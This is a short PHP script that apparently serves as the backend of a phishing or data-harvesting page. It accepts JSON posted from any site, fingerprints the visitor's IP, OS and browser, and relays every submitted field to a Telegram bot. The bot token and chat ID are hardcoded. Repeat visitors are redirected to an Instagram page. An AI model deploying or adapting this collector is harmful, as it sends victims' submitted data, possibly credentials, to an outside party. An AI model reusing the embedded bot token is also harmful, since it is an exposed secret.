<?php

$ipAddresses=[];

$ipListFilename = './ip_addresses.txt';

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$data = json_decode(file_get_contents("php://input"), true);

header("Access-Control-Allow-Origin: *");

$notificationChatIds = ['886259954'];

if (file_exists($ipListFilename)) {
	$ipAddresses = unserialize(file_get_contents($ipListFilename));
	$ipAddresses[] = $ip;
} else {
	$ipAddresses = [$ip];
}


function getOS() { 

    global $user_agent;

    $os_platform  = "Unknown OS Platform";

    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {

    global $user_agent;

    $browser        = "Unknown Browser";

    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}

function sendMessage($chatIdList, $messaggio, $token) {
	foreach ($chatIdList as $chatId) {
		file_get_contents('https://api.telegram.org/bot'. $token . '/sendMessage?chat_id=' . $chatId . '&parse_mode=markdown&text=' . $messaggio . '');
	}
}

function countIpInList($ip, $ipAddresses) {
	$count = 0;
	foreach ($ipAddresses as $value) {
		if($ip == $value) {
			$count++;
		}
	}
	return $count;
}
if(countIpInList($ip, $ipAddresses) > 30) {
	header('Location: https://www.instagram.com/nanonano_me/');
	die();
}
$message = '*' . $ip . '*: ' . getOS() . ' ' . getBrowser() . '
';

foreach ($data as $key => $value) {
	$message .= $key . ': ' . $value . '
';
}
$message = urlencode($message);

sendMessage($notificationChatIds, $message, '1472679430:AAGTsAVFSJxaDyO3jhCmPV401lEPUKxRjh0');

file_put_contents($ipListFilename, serialize($ipAddresses));